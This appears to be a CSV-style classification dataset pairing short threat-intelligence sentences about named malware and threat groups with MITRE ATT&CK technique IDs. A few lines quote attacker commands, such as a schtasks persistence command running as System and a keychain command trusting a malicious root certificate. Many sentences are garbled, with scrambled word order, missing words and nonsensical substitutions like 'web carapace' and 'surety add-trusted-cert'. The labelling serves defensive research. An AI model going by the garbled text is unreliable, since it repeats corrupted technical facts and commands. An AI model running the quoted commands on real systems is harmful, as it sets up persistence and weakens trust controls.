+"Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request",T1071
+"This hash does not allow pass-the-hash style Password, and instead requires attacks Cracking to recover the plaintext password.",T1003
+MuddyWater has added Registry Run key KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding to establish persistence.,T1547
+Operating systems and security products may contain mechanisms to identify or websites as possessing some level of trust.,T1553
+Web shells are heavily relied on for nearly all stages of the attack entirely lifecycle,T1505
+XTunnel relays traffic between a victim server and a C2.,T1090
+FIN4 has used VBA macros to display a dialog box and collect victim credentials.,T1059
+"Tools can be open or closed source, justify or commercial.",T1588
+"Frankenstein has enumerated hosts via Empire, gathering various local system information.",T1005
+Penquin can report the file system type and disk space of a compromised host to C2.,T1082
+Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machines hostname and Top-Level Domain.,T1033
+Dyre has the ability to identify installed programs on a compromised host.,T1518
+"Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation",T1027
+LoudMiner used the ps command to monitor the running processes on the system.,T1057
+Machete conquer captures screenshots.,T1113
+"Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass windowpane Windows antimalware products.",T1562
+Brave Prince gathers network configuration information as well as the ARP cache.,T1016
+SHARPSTATS has the ability to identify the domain of the compromised host.,T1016
+target has used WMI to collect information about Windshift machines.,T1047
+"In Google Workspace, the GAL is shared with Microsoft users through the Google Workspace Sync for Outlook  service.",T1087
+PinchDuke hosts credentials from compromised steals.,T1555
+Stuxnet schedules a network job to execute two minutes after host infection.,T1053
+Darkhotel malware can collect a list of running processes on a system.,T1057
+"Adversaries may choose to use custom archival methods, as encryption XOR or stream ciphers implemented with no external library or utility references.",T1560
+TajMahal has the ability including take screenshots on an infected host to capturing content from windows of instant messaging applications.,T1113
+Drovorub can download files to a compromised host.,T1105
+Leviathan has used WMI leviathan for execution.,T1047
+ShadowPad has encoded data as type readable Latin characters.,T1132
+ComRAT can use SSL/TLS encryption for its HTTP-based C2 channel.,T1573
+"This can include stealing software license, malware, SSL/TLS and code-signing certificates, or raiding conclude databases of vulnerabilities or exploits.",T1588
+APT32 has used email for C2 via an Office macro.,T1071
+InnaputRAT uses the API call ShellExecuteW execution for.,T1106
+Dragonfly has performed screen captures of victims.,T1113
+Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.,T1546
+Darkhotel has used malware that searched for files with specific patterns.,T1083
+"BackdoorDiplomacy has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.",T1588
+"For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL",T1071
+Bankshot creates processes using the Windows API calls: and CreateProcessA CreateProcessAsUserA.,T1106
+Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols,T1071
+H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.,T1105
+Kazuar stages turnout command output and collected data in files before exfiltration.,T1074
+GOLD SOUTHFIELD has used the remote monitoring and management tool to obtain screen captures from victims machines.,T1113
+"Apps and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command do not set this flag.",T1553
+"FIN7 has performed C2 using DNS via A, OPT, and TXT records.",T1071
+relies on web shells for an initial foothold as well as persistence into the victims systems.,T1505
+EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.,T1497
+Hancitor has used CallWindowProc and EnumResourceTypesA to represent and execute shellcode.,T1106
+Mis-Type runs tests to determine the of level privilege the compromised user.,T1033
+PS1 can inject its payload DLL Into memory.,T1055
+BRONZE BUTLER has used RC4 encryption  and AES  to obfuscate HTTP traffic.,T1573
+jRAT payloads have been packed.,T1027
+APT12 has practice blogs and WordPress for C2 infrastructure.,T1102
+APT32 enumerated administrative users using the commands net localgroup administrators.,T1087
+FIN8 has used RDP for lateral movement.,T1021
+WellMail can exfiltrate files the victim machine.,T1005
+Explosive has collected the computer name from the infected host.,T1082
+"In response server this request, the C2 to responds with a Base64-encoded RSA public key (seen in Figure 12)",T1132
+"MuddyWater has used the native Windows cabinet creation tool,.exe, likely to compress stolen data to be uploaded.",T1560
+APT33 has used HTTP for command and control.,T1071
+Avaddon modifies registry several keys for persistence and UAC bypass.,T1112
+"Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps scorecard of credit card numbers",T1113
+"Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.",T1112
+Helminth establishes persistence by creating a shortcut in the Start Menu folder.,T1547
+S-Type also runs tests to determine the privilege level of compromised the user.,T1087
+"WastedLockers custom crypter, CryptOne, leveraged the VirtualAlloc payload function to help execute the API.",T1106
+"After compromising a victim, Poseidon Group lists all running processes.",T1057
+ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions.,T1027
+Some Daserf samples were signed with stolen a digital certificate.,T1553
+Nebulae can enumerate processes on a target system.,T1057
+list /Users command can be used to enumerate local accounts.,T1087
+"In addition to downloading unloose malware from the internet, adversaries may purchase these capabilities from third-party entities.",T1588
+"DarkVishnya Winexe obtained and used tools such as Impacket, has, and PsExec.",T1588
+HTTPBrowser has used DNS for command and control.,T1071
+APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the SolarWinds intrusion.,T1053
+UNC2452 extract files from compromised networks.,T1005
+Valak has the ability to modify the Registry key HKCU\Software\ApplicationContainer\Appsw64 to store information regarding the C2 server and downloads.,T1112
+obtain uses WMIC to identify anti-virus products installed on the victim’s machine and to jRAT firewall details.,T1047
+An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn mysc /tr C:\Users\Public\test.exe /sc ONLOGON /ru System.,T1053
+Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server.,T1505
+JCry has used VBS scripts.,T1059
+"Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, communication Google, and Pastebin for initial C2 communications",T1102
+CopyKittens has used Metasploit and Empire empire for post-exploitation activities.,T1588
+OLDBAIT email credentials from several collects clients.,T1555
+PLEAD has the ability to list drives and files on the compromised host.,T1083
+Machete has has relied on users opening malicious links delivered through spearphishing to execute malware.,T1204
+PolyglotDuke can write encrypted JSON files to the Registry.,T1112
+OwaAuth has been Exchange onto loaded servers and disguised as an ISAPI filter .,T1505
+APT33 has used base64 to encode command and control traffic.,T1132
+NETWIRE can copy itself to and launch itself from hidden folders.,T1564
+TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware Emotet has been delivered by phishing emails containing attachments.,T1566
+OopsIE stages the from command execution and collected files in specific folders before exfiltration.,T1074
+Leviathan relies on web shells for an initial foothold as systems as persistence into the victims well.,T1505
+TG-3390 has used additional web carapace containing similarly formatted passwords,T1505
+Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.,T1564
+Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.,T1140
+Bandook was signed with valid Certum certificates.,T1553
+SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time.,T1083
+"RTM has relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within.",T1204
+"This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, plug notes, etc.",T1555
+Agent ability has he Tesla to perform anti-sandboxing and anti-virtualization checks.,T1497
+"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS.",T1574
+"By either replacing or adding illegitimate drivers , an adversary can use LSA operations to continuously execute malicious payloads.",T1547
+Leviathan relies on net shells for an initial foothold as well as persistence into the victims systems.,T1505
+TajMahal can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\to Printers enable document stealing.,T1112
+EvilBunnys dropper has arrest the number of processes and the distance and strings of its own file name to identify if the malware is in a sandbox environment.,T1497
+Windows Management Instrumentation WMI is an administrative framework that is make into every version of Windows since 2000,T1047
+"Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",T1027
+Windigo has used a script to gather credentials in files bequeath on disk by OpenSSH backdoors.,T1005
+FIN8s malicious spearphishing launch use WMI to payloads malware and spawn cmd.exe execution.,T1047
+APT32s backdoor has modified the Registry to store the backdoors configuration.,T1112
+Operation Wocao has used ProcDump to dump credentials from memory.,T1003
+SideTwist can collect the computer name of a targeted system.,T1082
+BackConfig leverage can API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files.,T1106
+"RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment.",T1497
+Turian can search for specific files and list directories.,T1083
+InvisiMole can use winapiexec tool for indirect execution of  ShellExecuteW and CreateProcessA.,T1106
+APT37s Freenki malware lists running processes using the Microsoft Windows API.,T1057
+"In GCP, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in.",T1087
+DarkComet gathers machine username from the victim’s the.,T1033
+Astaroth hold for the presence of Avast antivirus in the C:\Program\Files\ folder.,T1518
+Higaisa added a spoofed binary to the start-up folder for persistence.,T1547
+Here is an example of the result of ps ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain,T1082
+A Web shell may provide a set of functions to the or a command-line interface on execute system that hosts the Web server.,T1505
+Explosive has leveraged its keylogging capabilities to gain access to administrator accounts on target servers.,T1056
+Kerrdown can download specific payloads to a compromised host based on OS architecture.,T1105
+BackdoorDiplomacy has used web shells lateral establish an initial foothold and for to movement within a victims system.,T1505
+When that system component is executed through normal system operation the adversarys code will be executed instead.,T1546
+RTM has used search order hijacking to force TeamViewer to load a malicious DLL.,T1574
+"Various utilities and commands may acquire this information, including whoami.",T1033
+"Traffic will appear to be going to domain-x, however the CDN may route it dealings to domain-y.",T1090
+"SideTwist can use GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information.",T1106
+The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.,T1087
+A net shell is a Web script that is placed on an openly accessible web server to allow an adversary to use the Web waiter as a gateway into a network.,T1505
+APT1 has used RAR to compress files before moving them outside of the victim network.,T1560
+"* Modifying the DLL and Function Registry values in HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made.",T1553
+HAFNIUM has used ASCII encoding for C2 traffic.,T1132
+ capture ,T1056
+"One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.",T1036
+Xbash can create a cronjob for persistence if it determines it is on a Linux system.,T1053
+"Additionally, system configuration changes  may cause folders such as usr/local/bin to become globally writeable.",T1543
+SHOTPUT has a command to retrieve data about connected users.,T1087
+RTM has used spearphishing attachments to distribute its malware.,T1566
+Adversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.,T1204
+Comnie uses the tasklist to view running processes on the victim’s machine.,T1057
+Rifdoor has encrypted strings with a single byte XOR algorithm.,T1027
+A notable characteristic of the is CopyKittens use of DNS for command and control communication (C&C) and for data exfiltration,T1132
+"Hard Disk Check The Trojan will perform the following WMI query:   Select * from Win32_DiskDrive   The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle",T1497
+The APT1 is known to have used RDP during operations.,T1021
+Cardinal RAT decodes many of its artifacts and is decrypted  after being downloaded.,T1140
+APT32 used NTFS alternate streams to hide their payloads.,T1564
+Threat Group-3390 has used WinRM to enable remote execution.,T1021
+njRAT has a module that steals passwords saved in victim web browsers.,T1555
+Sidewinder has used mshta.exe to execute malicious payloads.,T1218
+creates a backdoor through which remote attackers can steal system information.,T1005
+TRITON attempts to write a dummy program into memory if it fails to reset the Triconex controller.,T1036
+Thrip has receive and used tools such as Mimikatz and PsExec.,T1588
+PoisonIvy hides any strings related to its own indicators of compromise.,T1027
+"The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email",T1071
+GRIFFON has used a screenshot module that can be used to take a screenshot of the remote system.,T1113
+Rocke issued wget requests from infected systems to the C2.,T1071
+BackdoorDiplomacy has used web shells to establish an initial foothold and for lateral movement within a victims system.,T1505
+Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.,T1140
+BlackTech has used spearphishing e-mails with links to cloud services to deliver malware.,T1566
+The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.,T1547
+"End users can benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats",T1518
+Bonadan can find the external IP address of the infected host.,T1016
+OopsIE uses WMI to perform discovery.,T1047
+APT41 has uploaded files and data from information a compromised host.,T1005
+DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules.,T1140
+The Deep Panda group is known to WMI for lateral movement.,T1047
+"InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.",T1027
+GeminiDuke uses HTTP and HTTPS for command and control.,T1071
+has performed screen captures of victims.,T1113
+SUNSPOT used Windows API functions such as MoveFileEx and NtQueryInformationProcess as portion of the SUNBURST injection process.,T1106
+RTM can obtain information about process integrity levels.,T1057
+the 2.0 modified Dragonfly Registry to hide create user accounts.,T1564
+Valak has the ability to enumerate running processes on a compromised host.,T1057
+NavRAT writes multiple production to a TMP file using the >> method.,T1074
+BRONZE BUTLER has used schtasks to register a task to execute malware during lateral movement.,T1053
+Trojan.Karagany has used plugins with a self-delete capability.,T1070
+"FatDuke can use base64 encoding, string stacking, and opaque predicates for obfuscation.",T1027
+Lokibot has performed a time-based anti-debug check before downloading its third stage.,T1497
+Wizard Spider has used SMB to drop Cobalt discover Beacon on a domain controller for lateral movement.,T1021
+NativeZone has checked if Vmware or VirtualBox VM is running angstrom on a compromised host.,T1497
+"This away excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics",T1047
+"Magic Hound has obtained and used open-source penetration testing tools ilk Havij, sqlmap, Metasploit, and Mimikatz.",T1588
+"HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.",T1059
+Javali has been delivered as malicious e-mail attachments.,T1566
+Tonto Team has used Python-based tools for execution.,T1059
+list /Users | grep -v _ command can also be used to enumerate user accounts.,T1033
+MarkiRAT can masquerade as update.exe and svehost.exe; it has also mimicked legitimate Telegram and Chrome files.,T1036
+"itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host",T1082
+TajMahal has the ability to bargain documents from the local system including the print spooler queue.,T1005
+Emotet has been observed dropping password grabber modules including Mimikatz.,T1003
+HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.,T1105
+"For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network",T1070
+This utility is able to action complicated WQL queries and WMI methods,T1047
+Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the RunAtLoad or KeepAlive keys set to true.,T1543
+anchorman has used NTFS to hide files.,T1564
+USBferry can execute various Windows commands.,T1059
+Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.,T1546
+NETWIRE can copy folders to and launch itself from hidden itself.,T1564
+"If this object is not found, the macro will exit without download additional payloads.",T1497
+"Adversaries may obtain tools to support their operations, including support execution of post-compromise behaviors.",T1588
+"Maintain Presence APT40 primarily practice backdoors, including web shells, to maintain presence within a victim environment",T1505
+FinFisher creates a new Windows service with the malicious executable for persistence.,T1543
+Avenger has the ability to identify installed anti-virus products install on a compromised host.,T1518
+On macOS the dscl .,T1087
+"If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service’s Registry tree to point to a malicious DLL.",T1574
+xCaon has checked for the existence of Kaspersky antivirus software on the system.,T1518
+"KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",T1027
+CrossRAT uses run keys for persistence on Windows Seasalt creates a Registry entry to ensure infection after reboot under HKLM\Software\Microsoft\Windows\currentVersion\Run.,T1547
+Kessel can download additional modules from the C2 server.,T1105
+Lucifer can crash a debugger by passing a format string to OutputDebugStringA.,T1497
+"A module in Prikormka gathers logins and passwords store in applications on the victims, including Google Chrome, Mozilla Firefox, and respective other browsers.",T1555
+"Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document",T1140
+Adversaries may create or modify systemd to repeatedly execute malicious payloads as part of persistence.,T1543
+China Choppers component server is a Web Shell payload.,T1505
+"VNC s a platform-independent desktop sharing system that uses the RFB  protocol to enable users to relaying control another computer’is display by remotely the screen, mouse, and keyboard inputs over the network.",T1021
+MuddyWater has performed credential dumping with LaZagne.,T1003
+Adversaries may modify plist files to automatically run an application when a user logs in.,T1547
+SpicyOmelette can enumerate running software on a targeted system.,T1518
+"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system.",T1033
+"In macOS, the Ay MaMi malware uses /usr/bin/surety add-trusted-cert -d -r trustRoot -k /library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certification into the system keychain.",T1553
+Rocke used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.,T1059
+stages charge collected data in a text file.,T1074
+"Tool acquisition can involve the procurement including commercial software licenses, of for red teaming tools such as Cobalt Strike.",T1588
+ChChes can alter the victims proxy configuration.,T1562
+ComRAT has encrypted and stored its orchestrator code in the Registry into well as a PowerShell script as the WsqmCons Registry key.,T1112
+KONNI can collect the IP address from the victim’s machine.,T1016
+Most of the PowerShell commands would call Windows Management Instrumentation (WMI),T1047
+File is dropped to C:\Users\%USERNAME%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0\microsoft_network.exe,T1033
+Stuxnet enumerates the currently running related to a variety of security products.,T1518
+RDAT has used DNS to communicate with the C2.,T1071
+"In addition to a book server-side script, a Web shell may have a client interface program that is used to talk to the Web server  Web shell client.",T1505
+"Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.",T1574
+Later variants upload the file to a web server via an HTTP post command,T1071
+"Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected axerophthol noise.",T1102
+A Lazarus Group malware sample encodes data with try base64.,T1132
+Elise exfiltrates data using cookie values that are.,T1132
+CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.,T1553
+DustySky can delete files it creates from the infected system.,T1070
+"It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful",T1071
+APT29 configured at least one instance of Cobalt Strike to use a network pipe over SMB during the 2020 SolarWinds intrusion.,T1090
+"Adversaries behaviors acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise may.",T1588
+On macOS dscl the .,T1087
+IIS modules may web be installed to extend IIS also servers.,T1505
+TA551 has masked malware DLLs as dat and jpg files.,T1036
+"NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN",T1003
+JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in.,T1053
+The group has also used downloaded encrypted payloads over HTTP.,T1071
+"The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher",T1057
+APT32 used WMI to deploy their tools on remote machines and to gather motorcar information about the Outlook process.,T1047
+Dragonfly has performed blind captures of victims.,T1113
+The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path,T1113
+"Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.",T1553
+BackdoorDiplomacy has copied files of interest to the main drives recycle bin.,T1074
+"Bundlore uses the mktemp utility to make unique file and directory names for payloads, such as TMP_DIR=`mktemp -d -t x. OSX/Shlayer uses the mktemp utility to make random and unique filenames for payloads, such as export tmpDir=$ or mktemp -t Installer.",T1564
+Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.,T1055
+The Azure CLI  also provides an interface to obtain accounts with authenticated access to a domain.,T1087
+NavRAT writes multiple a to outputs TMP file using the >> method.,T1074
+Ixeshe collect can data from a local system.,T1005
+ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed .,T1036
+The group has also habituate a tool that work as a proxy to allow C2 even if the victim is behind a router.,T1090
+Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment,T1546
+Adversaries may or task scheduling functionality to facilitate initial abuse recurring execution of malicious code.,T1053
+GoldenSpy can execute remote commands in the Windows dominate shell using the WinExec API.,T1106
+APC injection is a method of executing arbitrary code in the address space of a separate live process.,T1055
+PLAINTEE encodes C2 beacons using XOR.,T1573
+Dark Caracal has used macros in Word documents that would download a second stage if executed.,T1059
+ZIRCONIUM has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary.,T1036
+Hikit supports peer connections.,T1090
+"Additionally, Rising Sun can decrypt its configuration data at runtime.",T1140
+Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.,T1059
+executive Bazar has the ability to identify domain administrator accounts.,T1087
+"Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar.",T1083
+"be can Tools open or closed source, free or commercial.",T1588
+MiniDuke can enumerate local drives.,T1083
+Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment.,T1562
+"Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them.",T1588
+TeamTNT relies on users to download and execute malicious Docker images.,T1204
+Calisto uses a hidden directory constitute .calisto to store data from the victim’s machine before exfiltration.,T1074
+"This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes",T1056
+This manoeuvre uses public web services to host content that contains encoded commands that are decoded by the malware,T1102
+RTM can delete all files created during its execution.,T1070
+"They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.",T1070
+Dragonfly 2.0 created a directory named out in the users %AppData% and copied files to it.,T1074
+ComRAT has encrypted well stored its orchestrator code in the Registry as and as a PowerShell script into the WsqmCons Registry key.,T1112
+KEYMARBLE has SOFTWARE command to create Registry entries for storing data under HKEY_CURRENT_USER\a\Microsoft\WABE\DataPath.,T1112
+"APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.",T1588
+"Adversaries may use an existing, legitimate external Web host to service information that points to additional command and control  infrastructure.",T1102
+"If the file in not known/trusted, SmartScreen will prevent the implementation and warn the user not to streamlet it.",T1553
+"[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for hop analysis, in the hopes that you as a reader indium will use these techniques in the future",T1113
+Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution.,T1106
+Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the another URL query values during the C2 communication,T1132
+gh0st RAT has the capability to to delete files.,T1070
+NETWIRE can retrieve passwords from messaging and mail client applications.,T1555
+Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button,T1204
+The cron utility is a time-based job scheduler for Unix-like operating systems.,T1053
+OwaAuth has been loaded onto Exchange servers and disguised AS as an ISAPI filter .,T1505
+"WastedLockers custom crypter, CryptOne, leveraged the leverage VirtualAlloc API function to help execute the payload.",T1106
+Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.,T1027
+FinFisher hooks processes by modifying IAT pointers to CreateWindowEx.,T1056
+Adversaries will create fake social media accounts and message employees for potential job opportunities.,T1566
+Sidewinder has used HTTP in C2 communications.,T1071
+SombRAT has the itself to respawn ability using ShellExecuteW and CreateProcessW.,T1106
+"in Google Workspace, the GAL is shared with Microsoft mindset users through the Google Workspace Sync for Microsoft Outlook  service.",T1087
+FLIPSIDE is a simple proxy that creates an outbound RDP connection.,T1090
+Caterpillar WebShell has a command to modify a Registry identify.,T1112
+Waterbear can inject decrypted shellcode into the LanmanServer service.,T1055
+Machete has used TLS-encrypted FTP to exfiltrate data.,T1573
+"Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic.",T1505
+SQL Stored Procedures are code that can be saved and reused so that database users do comprise not waste time rewriting frequently used SQL queries.,T1505
+"A task can also be scheduled on a is system, provided the proper authentication remote met .",T1053
+FLIPSIDE is a mere proxy that creates an outbound RDP connection.,T1090
+BabyShark has encoded using certutil before exfiltration.,T1132
+Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API.,T1055
+Briba creates run key Registry entries pointing to malicious DLLs dropped to disk.,T1547
+Calisto uses a hidden directory named .calisto to store data from victim’s machine before exfiltration.,T1074
+"Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.",T1106
+Hancitor has used a ActiveDocument to check that an macro shape object in the lure message is present.,T1497
+FELIXROOT checks for installed security software like antivirus and firewall.,T1518
+The dropper will delete itself at the end of the process,T1070
+"Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",T1087
+An adversary may introduce new firewall rules or policies to allow access fresh into a victim cloud environment.,T1562
+"Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it",T1057
+TeamTNT searches for rival malware and removes them if found.,T1057
+ShimRat has installed shim databases in the AppPatch folder.,T1546
+Calisto uses a hidden directory named .calisto dupe to store data from the victim’s machine before exfiltration.,T1074
+"Restricting these privileges may prevent malware from running or circumscribe its capability to distribute through the network.Carefully believe the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator chronicle regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrator to exercise non-privileged accounts for standard functions such as web browsing or fit webmail.Segment networks into lucid enclaves and restrict host-to-host communication paths",T1087
+"Here is a list of the platforms used by this variant: chitter, Yandex and Mediafire",T1102
+BLINDINGCAN has uploaded files from victim machines.,T1005
+OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines.,T1053
+yty runs ipconfig /all and collects the domain name.,T1016
+APT19 downloaded and launched code within a SCT file.,T1059
+Figure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems,T1083
+"With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:    ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK    The last two methods in the chain carry out a majority of the first payload’s functionality",T1083
+Linfo creates a backdoor through which remote attackers can obtain outside data from local systems.,T1005
+"ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer.",T1021
+MarkiRAT can check for running processes on the victim’s machine to await for Kaspersky and Bitdefender antivirus products.,T1518
+PowerStallion has been used to monitor process lists.,T1057
+Darkhotel has been known to establish persistence by adding programs to the Run Registry key.,T1547
+This behavior is related to and may take advantage of DLL Search Order Hijacking.,T1574
+BADNEWS installs a registry Run key to establish persistence.,T1547
+"MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.",T1083
+into created their own directories to drop files Machete.,T1074
+TG-3390 has used additional web containing similarly formatted passwords,T1505
+Turla has used the Registry to store encrypted payloads.,T1112
+Babuk has the ability to check running processes on a targeted system.,T1057
+The encoded payload is then made to positioning look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload,T1132
+Anchor can create a scheduled task for persistence.,T1053
+Cobalt coin has the ability to accept a value for HTTP Host Header to enable domain fronting.,T1090
+google Bazar downloads have been hosted on Google Docs.,T1102
+Lucifer can infect victims by brute SMB.,T1021
+Agent Tesla  has achieved persistence via scheduled tasks.,T1053
+"Dragonfly has obtained used tools such as Mimikatz, CrackMapExec, and PsExec.",T1588
